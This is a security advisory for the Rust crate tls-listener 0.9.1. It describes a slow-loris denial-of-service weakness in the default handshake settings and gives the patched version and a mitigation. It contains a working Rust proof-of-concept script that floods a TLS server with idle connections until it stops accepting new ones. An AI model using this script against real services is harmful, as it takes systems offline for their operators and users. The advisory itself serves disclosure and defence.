# Slow loris vulnerability with default configuration

High

[tmccombs](/tmccombs)
published
GHSA-2qph-qpvm-2qf7
Mar 15, 2024

## Package

cargo

tls-listener
([Rust](/advisories?query=ecosystem%3Arust))

## Affected versions

0.9.1

## Patched versions

0.10.0

## Description

### Summary

With the default configuration of tls-listener, a malicious user can open 6.4 `TcpStream`s a second, sending 0 bytes, and can trigger a DoS.

### Details

The default configuration options make any public service using `TlsListener::new()` vulnerable to a slow-loris DoS attack.

```
/// Default number of concurrent handshakes
pub const DEFAULT_MAX_HANDSHAKES: usize = 64;
/// Default timeout for the TLS handshake.
pub const DEFAULT_HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(10);
```
### PoC

Running the HTTP TLS server example: <https://github.com/tmccombs/tls-listener/blob/6c57dea2d9beb1577ae4d80f6eaf03aad4ef3857/examples/http.rs>, then running the following script will prevent new connections to the server.

```
use std::{net::ToSocketAddrs, time::Duration};
use tokio::{io::AsyncReadExt, net::TcpStream, task::JoinSet};

#[tokio::main]
async fn main() {
    const N: usize = 1024;
    const T: Duration = Duration::from_secs(10);

    let url = "127.0.0.1:3000";
    let sockets: Vec<_> = url
        .to_socket_addrs()
        .unwrap()
        .inspect(|s| println!("{s:?}"))
        .collect();

    let mut js = JoinSet::new();

    let mut int = tokio::time::interval(T / (N as u32) / (sockets.len() as u32));
    int.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Burst);
    for _ in 0..10000 {
        for &socket in &sockets {
            int.tick().await;
            js.spawn(async move {
                let mut stream = TcpStream::connect(socket).await.unwrap();
                let _ = tokio::time::timeout(T, stream.read_to_end(&mut Vec::new())).await;
            });
        }
    }

    while js.join_next().await.is_some() {}
}
```
### Impact

This is an instance of a [slow-loris attack](https://en.wikipedia.org/wiki/Slowloris_%28computer_security%29). This impacts any publically accessible service using the default configuration of `tls-listener`

### Mitigation

Previous versions can mitigate this by passing a large value, such as `usize::MAX` as the parameter to `Builder::max_handshakes`.

### Severity

High

7.5

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
